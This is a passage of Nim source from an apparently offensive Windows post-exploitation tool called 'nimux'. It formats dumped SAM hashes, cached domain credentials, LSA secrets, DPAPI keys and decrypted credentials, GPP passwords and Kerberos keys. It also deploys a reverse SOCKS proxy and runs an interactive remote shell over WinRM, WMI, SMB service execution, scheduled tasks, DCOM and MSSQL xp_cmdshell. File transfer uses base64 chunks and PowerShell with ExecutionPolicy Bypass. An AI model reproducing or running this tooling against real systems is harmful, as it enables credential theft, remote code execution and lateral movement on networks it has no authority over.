      result.add bdy(dim("boot key   ") & cyan(bootKeyStr))
    if node{"success"}.getBool():
      let emptyNt = "31d6cfe0d16ae931b73c59d7e0c089c0"
      let lmPh    = dcsyncmod.LmHashPlaceholder
      let samArr = node{"sam_accounts"}
      if samArr.kind == JArray and samArr.len > 0:
        result.add bdy(dim("hashes     ") & green($samArr.len & " account(s)"))
        for acct in samArr:
          let user = acct{"username"}.getStr()
          let rid  = acct{"rid"}.getInt()
          let nt   = acct{"nt_hash"}.getStr()
          let lm   = acct{"lm_hash"}.getStr()
          result.add bdy("  " & bold(if user.len > 0: user else: "(unknown)") & " (RID " & $rid & ")")
          if nt.len > 0 and nt != emptyNt:
            result.add bdy("    " & dim("NT  ") & brightGreen(nt))
          let ntOut = if nt.len > 0: nt else: emptyNt
          result.add bdy("    " & dim(user & ":" & $rid & ":" & lmPh & ":" & ntOut & ":::"))
      let cachedArr = node{"cached_creds"}
      if cachedArr.kind == JArray and cachedArr.len > 0:
        result.add bdy(dim("cached     ") & green($cachedArr.len & " entry(s)"))
        for entry in cachedArr:
          let user   = entry{"username"}.getStr()
          let domain = entry{"domain"}.getStr()
          let dcc2   = entry{"dcc2"}.getStr()
          result.add bdy("  " & bold(domain & "/" & user))
          result.add bdy("    " & dim(dcc2))
      let lsaArr = node{"lsa_secrets"}
      if lsaArr.kind == JArray and lsaArr.len > 0:
        result.add bdy(dim("LSA secrets") & " " & green($lsaArr.len & " secret(s)"))
        for s in lsaArr:
          let sname = s{"name"}.getStr()
          let stype = s{"type"}.getStr()
          let shex  = s{"plaintext"}.getStr()
          result.add bdy("  " & bold(sname) & dim(" [" & stype & "]"))
          if shex.len > 0:
            if stype == "default_password":
              let acct = s{"account"}.getStr()
              let prefix = if acct.len > 0: acct & ":" else: ""
              result.add bdy("    " & cyan(prefix & shex))
            elif stype == "service":
              result.add bdy("    " & cyan(shex))
            elif stype == "machine_acc":
              result.add bdy("    " & dim("plain_password_hex:") & cyan(shex))
            else:
              result.add bdy("    " & dim(shex))
          let sNtHash  = s{"nt_hash"}.getStr()
          let sAccount = s{"account"}.getStr()
          let kerbArr  = s{"kerberos_keys"}
          if sNtHash.len > 0 and sAccount.len > 0:
            result.add bdy("    " & dim(sAccount & ":aad3b435b51404eeaad3b435b51404ee:") & cyan(sNtHash) & dim(":::"))
          if kerbArr != nil and kerbArr.kind == JArray:
            for k in kerbArr:
              let kt = k{"type"}.getStr()
              let kv = k{"key"}.getStr()
              result.add bdy("    " & dim(sAccount & ":" & kt & ":") & cyan(kv))
      let dbk = node{"domain_backup_key"}.getStr()
      if dbk.len > 0:
        result.add bdy(dim("Backup key ") & green("domain DPAPI backup key"))
        result.add bdy("    " & dim(dbk))
      let dmk = node{"dpapi_machine_key"}.getStr()
      let duk = node{"dpapi_user_key"}.getStr()
      if dmk.len > 0:
        result.add bdy(dim("DPAPI      ") & "machine key")
        result.add bdy("    " & dim("dpapi_machinekey:0x") & cyan(dmk))
        result.add bdy("    " & dim("dpapi_userkey:0x") & cyan(duk))
      let mkArr = node{"dpapi_master_keys"}
      if mkArr != nil and mkArr.kind == JArray and mkArr.len > 0:
        result.add bdy(dim("DPAPI      ") & green($mkArr.len & " master key(s) decrypted"))
        for mk in mkArr:
          let guid = mk{"guid"}.getStr()
          let kt = mk{"type"}.getStr()
          let key = mk{"key"}.getStr()
          result.add bdy("    " & dim("[" & kt & "] ") & bold(guid))
          result.add bdy("    " & dim("    key: ") & cyan(key))
      elif dmk.len > 0:
        let msg = node{"message"}.getStr()
        if msg.len > 0:
          result.add bdy(dim("DPAPI      ") & red(msg))
      let credArr = node{"dpapi_credentials"}
      if credArr != nil and credArr.kind == JArray and credArr.len > 0:
        var ok = 0; var fail = 0; var empty = 0
        for c in credArr:
          let err = c{"error"}.getStr()
          let target = c{"target"}.getStr()
          let user = c{"username"}.getStr()
          let blob = c{"cred_blob"}.getStr()
          let blobHx = c{"cred_blob_hex"}.getStr()
          if err.len > 0: inc fail
          elif target.len == 0 and user.len == 0 and blob.len == 0 and blobHx.len == 0: inc empty
          else: inc ok
        result.add bdy(dim("DPAPI      ") & green($ok & " credential(s)") &
          (if fail > 0: dim(" (" & $fail & " failed)") else: "") &
          (if empty > 0: dim(" (" & $empty & " empty)") else: ""))
        for c in credArr:
          let target = c{"target"}.getStr()
          let user   = c{"username"}.getStr()
          let blob   = c{"cred_blob"}.getStr()
          let blobHx = c{"cred_blob_hex"}.getStr()
          let err    = c{"error"}.getStr()
          if err.len > 0:
            result.add bdy("  " & dim("[" & c{"file"}.getStr() & "] ") & red(err))
          elif target.len == 0 and user.len == 0 and blob.len == 0 and blobHx.len == 0:
            result.add bdy("  " & dim("[" & c{"file"}.getStr() & "] ") & dim("decrypted - empty credential"))
          else:
            result.add bdy("  " & bold(target))
            if user.len > 0:
              result.add bdy("    " & dim("user: ") & cyan(user))
            if blob.len > 0:
              result.add bdy("    " & dim("pass: ") & yellow(blob))
            elif blobHx.len > 0:
              result.add bdy("    " & dim("blob: ") & cyan(blobHx))
      let gppArr = node{"gpp_passwords"}
      if gppArr != nil and gppArr.kind == JArray and gppArr.len > 0:
        result.add bdy(dim("GPP        ") & green($gppArr.len & " password(s)"))
        for g in gppArr:
          let gUser = g{"username"}.getStr()
          let gPass = g{"password"}.getStr()
          let gNew  = g{"new_name"}.getStr()
          let gDis  = g{"disabled"}.getStr()
          var label = if gNew.len > 0: gNew else: gUser
          if gDis == "1": label.add " [disabled]"
          result.add bdy("  " & bold(label))
          result.add bdy("    " & dim("pass: ") & yellow(gPass))
      let rawArr = node{"raw_lines"}
      if rawArr.kind == JArray and rawArr.len > 0:
        var kerberosLines: seq[string]
        var extraLines: seq[string]
        for item in rawArr:
          let line = item.getStr()
          if line.startsWith("[*]"):
            continue
          if line.contains(":aes") or line.contains(":des-") or line.contains(":rc4"):
            kerberosLines.add line
          elif line.contains(":") and line.endsWith(":::"):
            continue
          else:
            extraLines.add line
        if kerberosLines.len > 0:
          result.add bdy(dim("Kerberos   ") & green($kerberosLines.len & " key(s)"))
          for line in kerberosLines:
            let p = line.split(":")
            if p.len >= 3:
              result.add bdy("  " & bold(p[0]) & dim(":" & p[1] & ":") & cyan(p[2 .. ^1].join(":")))
            else:
              result.add bdy("  " & cyan(line))
        if extraLines.len > 0:
          result.add bdy(dim("secrets    ") & green($extraLines.len & " line(s)"))
          for line in extraLines:
            result.add bdy("  " & line)
    elif node{"error"}.getStr().len > 0:
      result.add bdy(red("error: ") & node["error"].getStr())
    elif node{"message"}.getStr().len > 0:
      result.add bdy(dim(node["message"].getStr()))
    result.add "\n" & gray("└" & repeat("─", 77))
    return
  of "socks":
    const BoxWS = 78
    proc topS(label: string): string =
      let head = "┌─ " & label & " "
      gray("┌─ ") & label & gray(" " & repeat("─", max(3, BoxWS - visibleLenAnsi(head))))
    proc botS(): string = gray("└" & repeat("─", BoxWS - 1))
    proc bdyS(t: string): string = gray("│  ") & t
    proc kvS(label, value: string): string = bdyS(padAnsiRight(dim(label), 12) & value)
    let op = node{"operation"}.getStr()
    let ok = node{"success"}.getBool()
    result = topS(bold("SOCKS") & "  " & brightCyan(host & ":" & $port))
    result.add "\n" & kvS("operation", brightCyan(op))
    result.add "\n" & kvS("status", if ok: green("ok") else: red("fail"))
    if ok and op == "deploy":
      let reverse = node{"reverse"}.getBool()
      let proxyHost = if reverse: "127.0.0.1" else: host
      result.add "\n" & kvS("socks5",
        bold(proxyHost & ":" & $node{"socks_port"}.getInt()))
      if reverse:
        result.add "\n" & kvS("transport",
          "reverse TCP tcp/" & $node{"control_port"}.getInt())
      if node{"pid"}.getStr().len > 0:
        result.add "\n" & kvS("pid", dim(node{"pid"}.getStr()))
      if node{"remote_path"}.getStr().len > 0:
        result.add "\n" & kvS("path", dim(node{"remote_path"}.getStr()))
      if node{"task_name"}.getStr().len > 0:
        result.add "\n" & kvS("task", dim(node{"task_name"}.getStr()))
      result.add "\n" & bdyS(dim("proxychains.conf: ") &
        "socks5 " & proxyHost & " " & $node{"socks_port"}.getInt())
      result.add "\n" & bdyS(dim("kill: ") &
        "nimux socks " & host & " [auth] --kill" &
        (if node{"pid"}.getStr().len > 0: " --pid " & node{"pid"}.getStr() else: "") &
        (if node{"remote_path"}.getStr().len > 0: " --socks-remote '" & node{"remote_path"}.getStr() & "'" else: "") &
        (if node{"task_name"}.getStr().len > 0: " --socks-task '" & node{"task_name"}.getStr() & "'" else: ""))
    else:
      let msg = node{"message"}.getStr()
      if msg.len > 0:
        result.add "\n" & kvS("message", if ok: dim(msg) else: red(msg))
    result.add "\n" & botS()
    return
  else:
    result = protocol & " " & host & ":" & $port
  if node["protocol"].getStr() != "smb":
    result.add " " & node["message"].getStr()

proc runShell(config: CliConfig) =
  let targets = parseTargets(config.targets)
  if targets.len == 0:
    raise newException(ValueError, "no targets supplied")
  if targets.len > 1:
    raise newException(ValueError, "--shell requires exactly one target")
  let host = targets[0]
  let proto = config.protocol
  let principal =
    if config.domain.len > 0: config.domain & "\\" & config.username
    else: config.username

  proc msSqlText(r: mssqlclient.MsSqlExecResult): string =
    for rs in r.resultSets:
      for row in rs.rows:
        var parts: seq[string]
        for cell in row:
          let value = cell.strip()
          if value.len > 0:
            parts.add value
        if parts.len > 0:
          if result.len > 0: result.add "\n"
          result.add parts.join(" ")
    if result.len == 0:
      for m in r.messages:
        if m.text.len > 0:
          if result.len > 0: result.add "\n"
          result.add m.text

  proc execCmd(cmd: string): tuple[output, err: string] =
    case proto
    of "winrm":
      let r = winrmclient.runWinRmCommand(
        host, config.port,
        config.username, config.password, config.ntlmHash, config.domain, cmd,
        config.useSsl,
        if config.kerberos: winrmclient.wamKerberos else: winrmclient.wamNtlm,
        ccache = config.ccachePath, krb5Config = config.krb5ConfigPath,
        spnOverride = config.ldapSpn)
      result.output = r.output
      if not r.success: result.err = r.message
    of "cim":
      let r = waitFor wmiexecmod.wmiExec(host, config.port,
        max(config.timeoutMs, 10000),
        config.username, config.password, config.ntlmHash, config.domain, cmd,
        authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
        ccache = config.ccachePath)
      result.output = r.output
      if not r.success: result.err = if r.error.len > 0: r.error else: r.message
    of "scm":
      let r = waitFor smbexecmod.smbExec(host, config.port,
        max(config.timeoutMs, 8000),
        config.username, config.password, config.ntlmHash, config.domain, cmd,
        authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
        ccache = config.ccachePath)
      result.output = r.output
      if not r.success: result.err = if r.error.len > 0: r.error else: r.message
    of "bin":
      raise newException(ValueError, "svc uses persistent session - should not reach execCmd")
    of "tsch":
      let r = waitFor atexecmod.atExec(host, config.port,
        max(config.timeoutMs, 8000),
        config.username, config.password, config.ntlmHash, config.domain, cmd,
        authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
        ccache = config.ccachePath)
      result.output = r.output
      if not r.success: result.err = if r.error.len > 0: r.error else: r.message
    of "mmc":
      let r = waitFor dcomexecmod.dcomExec(host, config.port,
        max(config.timeoutMs, 10000),
        config.username, config.password, config.ntlmHash, config.domain, cmd,
        if config.dcomObject.len > 0: config.dcomObject else: "MMC20",
        authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm)
      result.output = r.output
      if not r.success: result.err = if r.error.len > 0: r.error else: r.message
    of "mssql":
      let r = waitFor mssqlclient.runXpCmdshell(host, config.port,
        max(config.timeoutMs, 5000), config.username, config.password, cmd,
        ntlmHash = config.ntlmHash, domain = config.domain,
        kerberos = config.kerberos, linkedServer = config.mssqlLinkServer,
        ccache = config.ccachePath)
      result.output = msSqlText(r)
      if not r.success:
        result.err = if r.error.len > 0: r.error else: r.authMessage
    else:
      raise newException(ValueError, "--shell is not supported for " & proto)

  proc winrmResolvePath(spec, cwd: string): string =
    var path = spec.replace('/', '\\')
    if path.len == 0:
      return ""
    if path.len >= 2 and path[1] == ':':
      return path
    if path.startsWith("\\"):
      return "C:" & path
    var base = cwd.replace('/', '\\')
    if base.len > 0 and not base.endsWith("\\"):
      base.add "\\"
    base & path

  proc portableBaseName(path: string): string =
    let normalized = path.replace('\\', '/')
    result = extractFilename(normalized)
    if result.len == 0:
      result = normalized

  proc cleanAssemblyOutput(output: string): string =
    var text = output
    let marker = "#< CLIXML"
    let idx = text.find(marker)
    if idx >= 0:
      text = text[0 ..< idx]
    while text.len > 0 and text[^1] in {'\r', '\n', ' ', '\t'}:
      text.setLen(text.len - 1)
    result = text

  proc psQuote(text: string): string =
    "'" & text.replace("'", "''") & "'"

  proc resolveLocalTarget(localSpec, remotePath: string): string =
    let base = portableBaseName(remotePath)
    if localSpec.len == 0:
      return base
    if dirExists(localSpec) or localSpec.endsWith("/") or localSpec.endsWith("\\"):
      return joinPath(localSpec, base)
    localSpec

  proc winrmQuotePath(path: string): string =
    "'" & path.replace("'", "''") & "'"

  proc runWinRmShellCommand(cwd, cmd: string): tuple[output, err: string] =
    let fullCmd = "Set-Location -LiteralPath " & winrmQuotePath(cwd) & "; " & cmd
    let r = winrmclient.runWinRmCommand(
      host, config.port,
      config.username, config.password, config.ntlmHash, config.domain,
      fullCmd, config.useSsl,
      if config.kerberos: winrmclient.wamKerberos else: winrmclient.wamNtlm,
      ccache = config.ccachePath, krb5Config = config.krb5ConfigPath,
      spnOverride = config.ldapSpn)
    result.output = r.output
    if not r.success: result.err = r.message

  proc runWinRmShellCd(cwd, arg: string): tuple[output, err: string] =
    let target =
      if arg.len == 0: cwd
      else: winrmResolvePath(arg, cwd)
    if target.len == 0:
      result.err = "invalid path"
      return
    let cmd = "Set-Location -LiteralPath " & winrmQuotePath(target) &
      "; (Get-Location).Path"
    let r = winrmclient.runWinRmCommand(
      host, config.port,
      config.username, config.password, config.ntlmHash, config.domain,
      cmd, config.useSsl,
      if config.kerberos: winrmclient.wamKerberos else: winrmclient.wamNtlm,
      ccache = config.ccachePath, krb5Config = config.krb5ConfigPath,
      spnOverride = config.ldapSpn)
    result.output = r.output
    if not r.success: result.err = r.message

  proc shellHelpText(): string =
    result = """
local shell commands:
  help, /help          show this help
  exit, quit           close the shell
  cd <path>            change remote directory
  upload <local> [r]    upload a file
  download <remote> [l] download a file
  upload-dir <l> [r]    upload a directory recursively
  download-dir <r> [l]  download a directory recursively
  execute-assembly <local> [args...]
                       run a managed .NET assembly
"""

  proc showShellHelp() =
    let text = shellHelpText()
    stdout.write(text)
    if not text.endsWith("\n"):
      stdout.write "\n"
    flushFile(stdout)

  proc winrmUpload(localPath, remoteSpec, cwd: string): tuple[output, err: string] =
    if localPath.len == 0:
      result.err = "usage: upload <local> [remote]"
      return
    if not fileExists(localPath):
      result.err = "local file not found: " & localPath
      return
    let target =
      if remoteSpec.len > 0: winrmResolvePath(remoteSpec, cwd)
      else: winrmResolvePath(extractFilename(localPath), cwd)
    if target.len == 0:
      result.err = "remote path must not be empty"
      return
    let r = winrmclient.winRmUploadFile(
      host, config.port,
      config.username, config.password, config.ntlmHash, config.domain,
      localPath, target, config.useSsl,
      if config.kerberos: winrmclient.wamKerberos else: winrmclient.wamNtlm,
      ccache = config.ccachePath, krb5Config = config.krb5ConfigPath,
      spnOverride = config.ldapSpn)
    if not r.success:
      result.err = if r.message.len > 0: r.message else: "upload failed"
      return
    result.output = "uploaded " & $getFileSize(localPath) & " bytes to " & target

  proc winrmDownload(remoteSpec, localPath, cwd: string): tuple[output, err: string] =
    if remoteSpec.len == 0:
      result.err = "usage: download <remote> [local]"
      return
    let targetRemote = winrmResolvePath(remoteSpec, cwd)
    if targetRemote.len == 0:
      result.err = "remote path must not be empty"
      return
    let targetLocal =
      resolveLocalTarget(localPath, targetRemote)
    let r = winrmclient.winRmDownloadFile(
      host, config.port,
      config.username, config.password, config.ntlmHash, config.domain,
      targetRemote, targetLocal, config.useSsl,
      if config.kerberos: winrmclient.wamKerberos else: winrmclient.wamNtlm,
      ccache = config.ccachePath, krb5Config = config.krb5ConfigPath,
      spnOverride = config.ldapSpn)
    if not r.success:
      result.err = if r.message.len > 0: r.message else: "download failed"
      return
    result.output = " downloaded to " & targetLocal

  proc shellLoop(getCwd: proc(): string {.closure.};
                 runCmd: proc(cmd: string): tuple[output, err: string] {.closure.}) =
    var gShellCtrlC {.global.} = false
    var gShellHookSet {.global.} = false
    if not gShellHookSet:
      gShellHookSet = true
      setControlCHook(proc() {.noconv.} = gShellCtrlC = true)

    var cleanupPaths: seq[string]
    proc doCleanup() =
      if cleanupPaths.len > 0:
        let paths = cleanupPaths
        cleanupPaths.setLen(0)
        let delArgs = paths.mapIt("\"" & it & "\"").join(" ")
        discard runCmd("cmd /Q /C del /F /Q " & delArgs & " 2>nul")

    var cwd = getCwd()
    proc shellUsesWindowsPaths(): bool =
      if proto != "mssql" or config.mssqlLinkServer.len == 0:
        return true
      if cwd.len == 0:
        return true
      if cwd.startsWith("/"):
        return false
      if cwd.len >= 2 and cwd[1] == ':':
        return true
      if '\\' in cwd:
        return true
      false
    const SmbPort = 445
    initReadline()
    stderr.writeLine gray("[") & bold(proto) & gray("] ") &
      brightCyan(host & ":" & $config.port) & "  " & dim(principal)
    stderr.writeLine dim("type 'exit' to quit, ctrl-c to exit")

    proc resolveShellPath(spec: string): string =
      var path = spec.replace('/', '\\')
      if path.len == 0:
        return ""
      if path.len >= 2 and path[1] == ':':
        if path[0] notin {'c', 'C'}:
          return ""
        path = path[2 .. ^1]
      elif path.startsWith("\\"):
        path = path[1 .. ^1]
      else:
        var base = cwd.replace('/', '\\')
        if base.len >= 2 and base[1] == ':':
          if base[0] notin {'c', 'C'}:
            return ""
          base = base[2 .. ^1]
          if base.startsWith("\\"):
            base = base[1 .. ^1]
          if base.len > 0 and not base.endsWith("\\"):
            base.add "\\"
          path = base & path
      while path.startsWith("\\"):
        path = path[1 .. ^1]
      while path.endsWith("\\"):
        path = path[0 ..< path.len - 1]
      path

    proc transferRemotePath(spec: string): string =
      let resolved = resolveShellPath(spec)
      if resolved.len == 0:
        return ""
      resolved

    proc resolveWindowsPath(spec: string): string =
      var path = spec.replace('/', '\\')
      if path.len == 0:
        return ""
      if path.len >= 2 and path[1] == ':':
        return path
      if path.startsWith("\\"):
        return "C:" & path
      var base = cwd.replace('/', '\\')
      if base.len > 0 and not base.endsWith("\\"):
        base.add "\\"
      base & path

    proc windowsPathToSharePath(path: string): string =
      var p = path.replace('/', '\\')
      if p.len >= 3 and p[1] == ':' and p[2] == '\\':
        p = p[3 .. ^1]
      while p.startsWith("\\"):
        p = p[1 .. ^1]
      p

    proc runRemote(cmd: string): tuple[output, err: string] =
      let fullCmd = if cwd.len > 0: "cd /d \"" & cwd & "\" && " & cmd else: cmd
      runCmd(fullCmd)

    proc portableBaseName(path: string): string =
      let normalized = path.replace('\\', '/')
      result = extractFilename(normalized)
      if result.len == 0:
        result = normalized

    proc resolveLocalTarget(localSpec, remotePath: string): string =
      let base = portableBaseName(remotePath)
      if localSpec.len == 0:
        return base
      if dirExists(localSpec) or localSpec.endsWith("/") or localSpec.endsWith("\\"):
        return joinPath(localSpec, base)
      localSpec

    proc formatBytes(count: int): string =
      let v = float(count)
      if count >= 1_000_000_000:
        result = $(v / 1_000_000_000.0) & " GB"
      elif count >= 1_000_000:
        result = $(v / 1_000_000.0) & " MB"
      elif count >= 1_000:
        result = $(v / 1_000.0) & " KB"
      else:
        result = $count & " B"


    proc makeProgressReporter(kind, localPath, remotePath: string;
                              showSpeed = true; showStats = true): smbtransfer.SmbTransferProgress =
      let started = epochTime()
      var spinIdx {.global.}: int = 0
      const spinFrames = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
      const barWidth = 34
      result = proc(doneBytes, totalBytes: int; label: string; done: bool) =
        let elapsed = max(epochTime() - started, 0.001)
        let pct = if totalBytes > 0: (doneBytes * 100) div totalBytes else: 100
        let filled = if totalBytes > 0: (doneBytes * barWidth) div totalBytes else: barWidth
        let spin = if done: "✔" else: spinFrames[spinIdx mod spinFrames.len]
        inc spinIdx
        var bar = ""
        for i in 0 ..< barWidth:
          if i < filled:
            bar.add "━"
          elif i == filled and not done:
            bar.add "╸"
          else:
            bar.add "╌"
        let pctStr = align($pct & "%", 4)
        let sizeStr = formatBytes(doneBytes) & "/" & formatBytes(totalBytes)
        var extras = ""
        if done and showStats:
          extras = "  done in " & formatFloat(elapsed, ffDecimal, 1) & "s"
        elif showStats and showSpeed and elapsed > 0.3 and doneBytes > 0:
          let bps = doneBytes.float / elapsed
          extras = "  " & formatBytes(int(bps)) & "/s"
          let remaining = totalBytes - doneBytes
          if remaining > 0 and bps > 0:
            extras.add "  eta " & $int(remaining.float / bps) & "s"
        var line = "\r\e[K" & spin & "  " & kind & "  [" & bar & "]  " &
          pctStr
        if showStats:
          line.add "  " & sizeStr
        line.add extras
        if label.len > 0 and label != kind:
          line.add "  " & label
        if remotePath.len > 0:
          line.add "  " & remotePath
        if localPath.len > 0:
          line.add " -> " & localPath
        if done:
          line.add " "
        stderr.write(line)
        flushFile(stderr)
        if done:
          stderr.write("\n")
          flushFile(stderr)

    proc remoteParent(path: string): string =
      let idx = path.rfind('\\')
      if idx < 0:
        return ""
      path[0 ..< idx]

    proc quoteCmdPath(path: string): string =
      "\"" & path.replace("\"", "\"\"") & "\""

    proc quotePsString(text: string): string =
      "'" & text.replace("'", "''") & "'"

    proc parseFirstInt(text: string): int =
      for line in text.splitLines():
        let s = line.strip()
        if s.len == 0:
          continue
        try:
          return parseInt(s)
        except ValueError:
          discard
      -1

    proc shellRemoteFileSize(remoteAbs: string): int =
      let psSize =
        "if(Test-Path -LiteralPath " & quotePsString(remoteAbs) & "){" &
        "(Get-Item -LiteralPath " & quotePsString(remoteAbs) & ").Length}else{-1}"
      let r = runRemote("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command " &
        quoteCmdPath(psSize))
      parseFirstInt(r.output)

    proc shellUploadViaCommand(localPath, remoteAbs: string): tuple[output, err: string] =
      if localPath.len == 0:
        result.err = "usage: upload <local> [remote]"
        return
      if not fileExists(localPath):
        result.err = "local file not found: " & localPath
        return
      if remoteAbs.len == 0:
        result.err = "remote path must not be empty"
        return
      let contents = readFile(localPath)
      let total = contents.len
      let b64Path = remoteAbs & ".b64"
      let progress = makeProgressReporter("upload", localPath, remoteAbs,
        showSpeed = false, showStats = false)
      let parent = remoteParent(remoteAbs)
      if parent.len > 0:
        let mk = runRemote("cmd /Q /C if not exist " & quoteCmdPath(parent) &
          " mkdir " & quoteCmdPath(parent))
        if mk.err.len > 0:
          result.err = mk.err
          return
      let init = runRemote("cmd /Q /C del /F /Q " & quoteCmdPath(remoteAbs) &
        " " & quoteCmdPath(b64Path) & " 2>nul & type nul > " & quoteCmdPath(b64Path))
      if init.err.len > 0:
        result.err = init.err
        return
      if progress != nil:
        progress(0, total, "upload", false)
      if total == 0:
        let empty = runRemote("cmd /Q /C type nul > " & quoteCmdPath(remoteAbs) &
          " & del /F /Q " & quoteCmdPath(b64Path) & " 2>nul")
        if empty.err.len > 0:
          result.err = empty.err
          return
        if progress != nil:
          progress(0, 0, "upload", true)
        result.output = " uploaded 0 bytes to " & remoteAbs & " via command channel"
        return
      let encoded = base64.encode(contents)
      const ChunkChars = 1500
      var offset = 0
      while offset < encoded.len:
        let take = min(ChunkChars, encoded.len - offset)
        let chunk = encoded[offset ..< offset + take]
        let append = runRemote("cmd /Q /C <nul set /p \"=" & chunk & "\">>" &
          quoteCmdPath(b64Path) & " & echo.>>" & quoteCmdPath(b64Path))
        if append.err.len > 0:
          discard runRemote("cmd /Q /C del /F /Q " & quoteCmdPath(b64Path) & " 2>nul")
          result.err = append.err
          return
        offset += take
        if progress != nil:
          progress(min(total, (offset * 3) div 4), total, "upload", false)
      let psDecode =
        "$b64=Get-Content -Raw -LiteralPath " & quotePsString(b64Path) & ";" &
        "[IO.File]::WriteAllBytes(" & quotePsString(remoteAbs) &
        ",[Convert]::FromBase64String($b64));" &
        "Remove-Item -Force -LiteralPath " & quotePsString(b64Path) & ";" &
        "(Get-Item -LiteralPath " & quotePsString(remoteAbs) & ").Length"
      let decodeCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command " &
        quoteCmdPath(psDecode)
      let decoded = runRemote(decodeCmd)
      if decoded.err.len > 0:
        result.err = decoded.err
        return
      let remoteSize = parseFirstInt(decoded.output)
      if remoteSize != total:
        result.err = "remote size verification failed: " & $max(remoteSize, 0) &
          " of " & $total & " bytes"
        return
      if progress != nil:
        progress(total, total, "upload", true)
      result.output = " uploaded " & $total & " bytes to " & remoteAbs &
        " via command channel"

    proc shellDownloadViaCommand(remoteAbs, localPath: string): tuple[output, err: string] =
      if remoteAbs.len == 0:
        result.err = "remote path must not be empty"
        return
      if localPath.len == 0:
        result.err = "local path must not be empty"
        return
      let progress = makeProgressReporter("download", localPath, remoteAbs,
        showSpeed = false, showStats = false)
      if progress != nil:
        progress(0, 100, "download", false)
      let psRead =
        "$p=" & quotePsString(remoteAbs) & ";" &
        "if(!(Test-Path -LiteralPath $p)){Write-Output '__NIMUX_MISSING__';exit 2};" &
        "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes($p));" &
        "for($i=0;$i -lt $b.Length;$i+=180){$n=[Math]::Min(180,$b.Length-$i);$b.Substring($i,$n)}"
      let r = runRemote("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command " &
        quoteCmdPath(psRead))
      if r.err.len > 0:
        result.err = r.err
        return
      var encoded = ""
      for line in r.output.splitLines():
        let s = line.strip()
        if s.len == 0:
          continue
        if s == "__NIMUX_MISSING__":
          result.err = "remote file not found: " & remoteAbs
          return
        var ok = true
        for ch in s:
          if not (ch in {'A'..'Z', 'a'..'z', '0'..'9', '+', '/', '='}):
            ok = false
            break
        if ok:
          encoded.add s
      if encoded.len == 0:
        result.err = "remote file produced no data: " & remoteAbs
        return
      var bytes: string
      try:
        bytes = base64.decode(encoded)
      except CatchableError as e:
        result.err = "base64 decode failed: " & e.msg
        return
      let parent = parentDir(localPath)
      if parent.len > 0:
        createDir(parent)
      try:
        writeFile(localPath, bytes)
      except CatchableError as e:
        result.err = "local write failed: " & e.msg
        return
      if progress != nil:
        progress(100, 100, "download", true)
      result.output = " downloaded " & $bytes.len & " bytes to " & localPath &
        " via command channel"

    proc collectLocalFiles(root: string): tuple[files: seq[string], totalBytes: int] =
      for path in walkDirRec(root):
        if fileExists(path):
          result.files.add path
          result.totalBytes += getFileSize(path).int

    proc uploadDirViaCommand(localRoot, remoteRoot: string) =
      if not dirExists(localRoot):
        stderr.writeLine red("error: ") & "local directory not found: " & localRoot
        return
      let rootAbs = absolutePath(localRoot)
      let baseRemoteAbs = if remoteRoot.len > 0: resolveWindowsPath(remoteRoot)
                          else: resolveWindowsPath(extractFilename(localRoot))
      if baseRemoteAbs.len == 0:
        stderr.writeLine red("error: ") & "remote path must not be empty"
        return
      let collected = collectLocalFiles(rootAbs)
      var doneBytes = 0
      for path in collected.files:
        let rel = relativePath(absolutePath(path), rootAbs).replace('/', '\\')
        let remoteFileAbs = if rel.len > 0: baseRemoteAbs & "\\" & rel else: baseRemoteAbs
        let r = shellUploadViaCommand(path, remoteFileAbs)
        if r.err.len > 0:
          stderr.write "\n"
          stderr.writeLine red("error: ") & r.err
          return
        doneBytes += getFileSize(path).int
      stderr.writeLine green("uploaded " & $doneBytes & " bytes via command channel")

    proc commandRemoteFiles(remoteRoot, localRoot: string): seq[tuple[remoteAbs, localPath: string; size: int]] =
      let remoteAbs = resolveWindowsPath(remoteRoot)
      let psList =
        "$root=" & quotePsString(remoteAbs) & ";" &
        "if(!(Test-Path -LiteralPath $root)){Write-Output '__NIMUX_MISSING__';exit 2};" &
        "$base=(Resolve-Path -LiteralPath $root).Path.TrimEnd('\\');" &
        "Get-ChildItem -LiteralPath $base -Recurse -File | ForEach-Object {" &
        "$rel=$_.FullName.Substring($base.Length).TrimStart('\\');" &
        "Write-Output ($_.FullName+'|'+$_.Length+'|'+$rel)}"
      let r = runRemote("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command " &
        quoteCmdPath(psList))
      for line in r.output.splitLines():
        let s = line.strip()
        if s.len == 0 or s == "__NIMUX_MISSING__":
          continue
        let parts = s.split("|")
        if parts.len < 3:
          continue
        var size = 0
        try:
          size = parseInt(parts[1])
        except ValueError:
          discard
        let rel = parts[2].replace('\\', '/')
        let target = if localRoot.len > 0: joinPath(localRoot, rel) else: rel
        result.add (remoteAbs: parts[0], localPath: target, size: size)

    proc downloadDirViaCommand(remoteRoot, localRoot: string) =
      if remoteRoot.len == 0:
        stderr.writeLine red("error: ") & "usage: download-dir <remote> [local]"
        return
      let files = commandRemoteFiles(remoteRoot, localRoot)
      if files.len == 0:
        stderr.writeLine red("error: ") & "no files found or remote directory not readable: " & remoteRoot
        return
      var doneBytes = 0
      for item in files:
        let r = shellDownloadViaCommand(item.remoteAbs, item.localPath)
        if r.err.len > 0:
          stderr.write "\n"
          stderr.writeLine red("error: ") & r.err
          return
        doneBytes += item.size
      stderr.writeLine green("downloaded " & $doneBytes & " bytes via command channel")

    proc uploadDirRecursive(localRoot, remoteRoot: string) =
      if proto == "mssql":
        uploadDirViaCommand(localRoot, remoteRoot)
        return
      if not dirExists(localRoot):
        stderr.writeLine red("error: ") & "local directory not found: " & localRoot
        return
      let rootAbs = absolutePath(localRoot)
      let baseRemoteAbs = if remoteRoot.len > 0: resolveWindowsPath(remoteRoot)
                          else: resolveWindowsPath(extractFilename(localRoot))
      if baseRemoteAbs.len == 0:
        stderr.writeLine red("error: ") & "remote path must be on C: and must not be empty"
        return
      let session = waitFor smbclient.establishSmbSession(host, SmbPort,
        max(config.timeoutMs, 5000),
        smbclient.SmbCredential(
          username: config.username, password: config.password,
